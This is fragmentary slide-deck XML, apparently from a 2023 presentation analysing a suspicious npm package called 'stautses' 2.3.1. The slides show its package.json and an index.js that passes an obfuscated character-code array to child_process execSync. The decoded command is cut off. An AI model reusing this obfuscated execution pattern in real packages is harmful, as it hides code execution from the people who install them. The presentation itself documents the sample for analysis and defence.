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6480175" cy="6497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726"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="118" d="100"/>
          <a:sy n="118" d="100"/>
        </p:scale>
        <p:origin x="14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0A27C-FE9B-654D-85A4-98F92A04DAB2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90713" y="1143000"/>
            <a:ext cx="307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EC31D-4B10-7D49-BF54-2E2C371A60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58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013" y="1063387"/>
            <a:ext cx="5508149" cy="2262141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22" y="3412764"/>
            <a:ext cx="4860131" cy="1568758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130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850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37" y="1619899"/>
            <a:ext cx="5589151" cy="2702836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137" y="4348305"/>
            <a:ext cx="5589151" cy="1421358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/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75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503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512" y="1729695"/>
            <a:ext cx="2754074" cy="41226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0589" y="1729695"/>
            <a:ext cx="2754074" cy="41226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387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345940"/>
            <a:ext cx="5589151" cy="125591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57" y="1592824"/>
            <a:ext cx="2741417" cy="780619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57" y="2373443"/>
            <a:ext cx="2741417" cy="34909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589" y="1592824"/>
            <a:ext cx="2754918" cy="780619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0589" y="2373443"/>
            <a:ext cx="2754918" cy="34909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443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747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79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33176"/>
            <a:ext cx="2090025" cy="151611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4918" y="935541"/>
            <a:ext cx="3280589" cy="4617534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949292"/>
            <a:ext cx="2090025" cy="3611303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1915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56" y="433176"/>
            <a:ext cx="2090025" cy="151611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4918" y="935541"/>
            <a:ext cx="3280589" cy="4617534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56" y="1949292"/>
            <a:ext cx="2090025" cy="3611303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4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65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7375" y="345939"/>
            <a:ext cx="1397288" cy="5506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512" y="345939"/>
            <a:ext cx="4110861" cy="5506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186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512" y="345940"/>
            <a:ext cx="5589151" cy="1255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512" y="1729695"/>
            <a:ext cx="5589151" cy="4122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512" y="6022349"/>
            <a:ext cx="1458039" cy="345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74B21-E513-2745-970B-E8B28C44A173}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>2023/4/23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6558" y="6022349"/>
            <a:ext cx="2187059" cy="345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6624" y="6022349"/>
            <a:ext cx="1458039" cy="345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357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727132F-0F5C-4B5B-EC4E-F94895A1F1EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="192087" y="465667"/>
            <a:ext cx="6096000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" altLang="zh-CN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"name"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dirty="0" err="1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stautses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN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"version"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"2.3.1"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"scripts"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</a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC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"test"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dirty="0" err="1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uname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="032F6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-a"</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN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DA4BD1-275D-31C0-787D-4BE7441C4A2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="192087" y="2900312"/>
            <a:ext cx="6096000" cy="31393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" altLang="zh-CN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child_process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’).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN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execSync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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" dirty="0" err="1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dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="6F42C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([101,99,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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103,90,113,115,50,84,82,78,81,115,85,75,114,83,76,83,74,69,118,73,119,84,88,116,119,119,67,86,87,119,83,68,98,74,73,51,50,53,55,80,80,104,74,66,108,85,121,100,78,49,90,55,65,57,118,109,100,101,54,43,80,119,121,67,54,110,100,53,53,97,86,85,54,101,86,88,108,66,88,77,111,98,54,82,68,99,121,89,48,83,89,76,53,84,90,82,52,80,57,65,82,100,89,110,79,109,104,86,70,82,87,98,120,90,74</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN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...])+__filename);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7D6A87-76AB-72AE-F486-52808E3DAA76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="192087" y="786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stautses-2.3.1/package/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package.json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BC5398-7CFC-71EB-ACEA-718005552242}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="192087" y="25132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stautses-2.3.1/package/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en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index.js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655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59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Courier New</vt:lpstr>
      <vt:lpstr>Times New Roman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峻安 张</dc:creator>
  <cp:lastModifiedBy>Huang Kaifeng</cp:lastModifiedBy>
  <cp:revision>25</cp:revision>
  <cp:lastPrinted>2023-04-10T03:38:56Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-04-10T02:45:49Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-04-23T13:28:08Z</dcterms:modified>
</cp:coreProperties>
</file>